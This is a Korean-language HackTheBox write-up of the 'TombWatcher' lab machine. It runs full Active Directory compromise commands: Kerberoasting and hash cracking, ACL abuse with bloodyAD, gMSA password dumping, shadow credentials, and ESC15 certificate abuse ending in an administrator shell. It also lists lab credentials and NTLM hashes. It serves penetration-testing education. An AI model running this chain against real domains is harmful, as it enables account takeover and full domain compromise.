# TombWatcher - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49695,49696,49698,49716,53,593,5985,636,65458,80,88,9389 -sC -sV -vv -oA TombWatcher 10.129.232.167
```
<img width="1202" height="378" alt="image" src="https://github.com/user-attachments/assets/af0a562a-7ff2-43b3-871b-299c619f4007" />
<img width="1202" height="201" alt="image" src="https://github.com/user-attachments/assets/64e367c2-8b4f-4290-b70e-2aac99d51e00" />
<img width="1202" height="69" alt="image" src="https://github.com/user-attachments/assets/0af8f591-af2e-4384-b8a9-5a77c2797b6f" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- WINRM(5985)
- CA

<br>

- `/etc/hosts`에 `dc01.tombwatcher.htb`추가.
<img width="1202" height="69" alt="image" src="https://github.com/user-attachments/assets/9002f82d-eec9-43c0-b243-8d8f1a183887" />

---
## Auth as alfred
- 유저목록 수집.
```bash
nxc smb 10.129.232.167 -u henry -p H3nry_987TGV! --users
```
<img width="1202" height="406" alt="image" src="https://github.com/user-attachments/assets/eedd1d19-5182-45b1-a638-bfe81ea7ad56" />

<br>
<br>

- 특별한 정보 찾지 못해서 AD 정보 수집.
- `Alfred`유저로 `WriteSPN`권한 발견.
```bash
bloodhound-python -u henry -p H3nry_987TGV! -d tombwatcher.htb -c all --zip -ns 10.129.232.167

rusthound-ce -d tombwatcher.htb -u john -p password
```
<img width="1036" height="104" alt="image" src="https://github.com/user-attachments/assets/09abb0df-264f-4503-b6e4-1370606ec1cc" />

<br>
<br>

- `Alfred`해시 탈취.
```bash
python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV!
```
<img width="1203" height="583" alt="image" src="https://github.com/user-attachments/assets/d715b207-c677-4fb7-8427-d9295ac94c19" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1203" height="229" alt="image" src="https://github.com/user-attachments/assets/c2c969d6-a7a8-4cb5-af45-3007304a9c72" />

<br>
<br>

- `alfred:basketball` 로그인 성공.
```bash
nxc smb 10.129.232.167 -u alfred -p basketball
```
<img width="1203" height="120" alt="image" src="https://github.com/user-attachments/assets/09e22738-0765-4a6e-acf5-2711fe28ee6a" />

---
## Auth as ansible_dev$
- `intrastructure`그룹으로 `AddSelf`권한 발견.
<img width="1203" height="120" alt="image" src="https://github.com/user-attachments/assets/a03f1326-1de1-434a-a7a0-9fd74d7f5288" />

<br>
<br>

- `alfred`를 `infrastructure`그룹에 추가.
```bash
bloodyAD -d tombwatcher.htb --host dc01.tombwatcher.htb -u alfred -p basketball add groupMember infrastructure alfred
```
<img width="1203" height="100" alt="image" src="https://github.com/user-attachments/assets/12946b02-2f72-438c-a9c9-8b18f5c16328" />

<br>
<br>

- `ansible_dev$`로 `ReadGMSAPassword`권한 발견.
<img width="1181" height="88" alt="image" src="https://github.com/user-attachments/assets/92d0375e-a367-4e75-91b1-10e2519b3b0e" />

<br>
<br>

- `gMSADumper`를 사용하여 `ansible_dev$`의 해시 획득.
```bash
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
```
<img width="1206" height="159" alt="image" src="https://github.com/user-attachments/assets/ccbb845b-625d-48f8-8016-b54b57af043f" />

<br>
<br>

- `ansible_dev$:93f81a98d22217b6206d950528a4802e` 로그인 성공.
```bash
nxc smb 10.129.1.17 -u 'ansible_dev$' -H 93f81a98d22217b6206d950528a4802e
```
<img width="1206" height="119" alt="image" src="https://github.com/user-attachments/assets/964493ef-d919-4f43-abd6-d2ff45ad59a6" />

---
## Auth as sam
- `sam`유저로 `ForceChangePassword`권한 발견.
<img width="1020" height="97" alt="image" src="https://github.com/user-attachments/assets/8bbca7bd-7575-4e2b-86a9-0e07c7d644b7" />

<br>
<br>

- `sam`유저의 비밀번호 변경.
```bash
bloodyAD -d tombwatcher.htb -u ansible_dev$ -p 93f81a98d22217b6206d950528a4802e:93f81a98d22217b6206d950528a4802e --host dc01.tombwatcher.htb set password sam password
```
<img width="1205" height="97" alt="image" src="https://github.com/user-attachments/assets/04514f1a-5755-46b1-acfd-16db9795b4b1" />

<br>
<br>

- `sam:password` 로그인 성공.
```bash
nxc smb 10.129.1.17 -u sam -p password
```
<img width="1205" height="118" alt="image" src="https://github.com/user-attachments/assets/172fd682-33b9-4dd6-a7e8-4f6859aab723" />

---
## Shell as john
- `john`유저로 `WriteOwner`권한 발견.
<img width="1157" height="95" alt="image" src="https://github.com/user-attachments/assets/1965d2ba-8ffa-4937-bebe-08031e1089bb" />

<br>
<br>

- `john`의 계정을 `sam`의 소유로 변경.
```bash
bloodyAD -d tombwatcher.htb --host dc01.tombwatcher.htb -u sam -p password set owner john sam
```
<img width="1204" height="79" alt="image" src="https://github.com/user-attachments/assets/b493baa7-d1bf-4858-8dc4-1ac0a0d3c8c2" />

<br>
<br>

- `genericAll` 권한 부여.
```bash
bloodyAD -d tombwatcher.htb --host dc01.tombwatcher.htb -u sam -p password add genericAll john sam
```
<img width="1204" height="79" alt="image" src="https://github.com/user-attachments/assets/5224c0a2-5321-45dd-86bc-c85700ff20f7" />

<br>
<br>

- 해시 탈취를 시도했으나 에러 발생.
```bash
certipy-ad shadow auto -u sam@tombwatcher.htb -p password -account john -dc-ip 10.129.1.20
```
<img width="1204" height="535" alt="image" src="https://github.com/user-attachments/assets/47805eea-5c02-4572-a4df-4673ff23d7bc" />

<br>
<br>

- `john`의 비밀번호 변경.
```bash
bloodyAD -d tombwatcher.htb --host dc01.tombwatcher.htb -u sam -p password set password john password
```
<img width="1204" height="75" alt="image" src="https://github.com/user-attachments/assets/1d73557b-3a11-4213-913f-d142da018af4" />

<br>
<br>

- `john:password` 로그인 성공.
```bash
nxc winrm 10.129.1.20 -u john -p password
```
<img width="1204" height="205" alt="image" src="https://github.com/user-attachments/assets/09755999-7920-4480-a57b-224442322a23" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.1.20 -u john -p password
```
<img width="1204" height="291" alt="image" src="https://github.com/user-attachments/assets/1822fe5f-a889-483a-ad46-27731afae72a" />

---
## Auth as cert_admin
- CA에 관해서 확인 중에 특이한 Object 발견.
<img width="1204" height="781" alt="image" src="https://github.com/user-attachments/assets/007a1e2f-9d39-4f0b-8c0b-c2feef443c32" />

<br>
<br>

- 존재하지 않는 계정이기에 삭제되었는지 확인해보니 삭제되었던 상태.
```powershell
Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"

Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
<img width="1204" height="442" alt="image" src="https://github.com/user-attachments/assets/93ff5726-e7c0-4ad2-9b9e-db1add4d63bd" />

<br>
<br>

- 복구가 가능하지 확인하기 위해 `AD Recycle Bin` 기능 확인.
```powershell
Get-ADOptionalFeature 'Recycle Bin Feature'
```
<img width="1204" height="342" alt="image" src="https://github.com/user-attachments/assets/9a2f61d2-25dd-4fbe-b8e6-cca2542bd4d1" />

<br>
<br>

- `GUID`를 사용하여 오브젝트 복구.
```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf

Get-ADUser cert_admin
```
<img width="1204" height="315" alt="image" src="https://github.com/user-attachments/assets/343c9b9c-95bd-4ac2-83d4-cfe4e9878788" />

<br>
<br>

- `ADCS`로 `GenericAll`권한 발견.
<img width="974" height="375" alt="image" src="https://github.com/user-attachments/assets/5de6ede8-c6ff-4f25-a183-9c219547a543" />

<br>
<br>

- `cert_admin`의 `LastKnownParent`가 `ADCS`이기에 `GenericAll`권한을 `cert_admin`에게 행사가 가능.
- `cert_admin` 해시 획득.
```bash
certipy-ad shadow auto -u john@tombwatcher.htb -p password -account cert_admin -dc-ip 10.129.1.20
```
<img width="1205" height="534" alt="image" src="https://github.com/user-attachments/assets/3ae28ae0-495a-4c37-a9f5-0e5bd1e992ae" />

---
## Privesc
- `ESC15` 취약점 발견.
```bash
certipy-ad find -u cert_admin -hashes :f87ebf0febd9c4095c68a88928755773 -target dc01.tombwatcher.htb -text -stdout -vulnerable
```
<img width="1205" height="120" alt="image" src="https://github.com/user-attachments/assets/37b8abd5-48c1-4eab-959e-6ce03fdc5ece" />

<br>
<br>

- `administrator` 인증서 요청.
```bash
certipy-ad req -u cert_admin@tombwatcher.htb -hashes f87ebf0febd9c4095c68a88928755773 -dc-ip 10.129.1.20 -target dc01.tombwatcher.htb -ca TOMBWATCHER-CA-1 -template WebServer -upn administrator@tombwatcher.htb -sid S-1-5-21-1392491010-1358638721-2126982587-519 -application-policies 'Client Authentication'
```
<img width="1205" height="296" alt="image" src="https://github.com/user-attachments/assets/b52ace9e-63d8-45dd-b213-b98e61a65508" />

<br>
<br>

- ldap_shell 획득.
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.1.20 -ldap-shell
```
<img width="1205" height="316" alt="image" src="https://github.com/user-attachments/assets/39dc06d0-5033-4fb4-b0a9-261e0d310a76" />

<br>
<br>

- `administrator`의 비밀번호 변경.
```
change_password administrator password
```
<img width="1205" height="99" alt="image" src="https://github.com/user-attachments/assets/ce94a0fe-a168-4348-b9f1-adf8edab7a7b" />

<br>
<br>

- `administrator:password` 로그인 성공.
```bash
nxc winrm 10.129.1.20 -u administrator -p password
```
<img width="1205" height="208" alt="image" src="https://github.com/user-attachments/assets/a201783a-ce5f-4706-80fe-0f93d6913a3f" />

<br>
<br>

- 셸 획득.
```bash
evil-winrm -i 10.129.1.20 -u administrator -p password
```
<img width="1205" height="292" alt="image" src="https://github.com/user-attachments/assets/430e655c-9a1d-406d-84e0-985b4c39bdf8" />

---
## FLAG
- `c:\users\john\desktop\user.txt`
<img width="1205" height="209" alt="image" src="https://github.com/user-attachments/assets/06ff90de-475e-4171-94e6-3e9164701dcd" />

<br>
<br>

- `c:\users\administrator\desktop\root.txt`
<img width="1205" height="209" alt="image" src="https://github.com/user-attachments/assets/0ab6c25d-429a-43ba-8cd7-a6fc2817c0e2" />
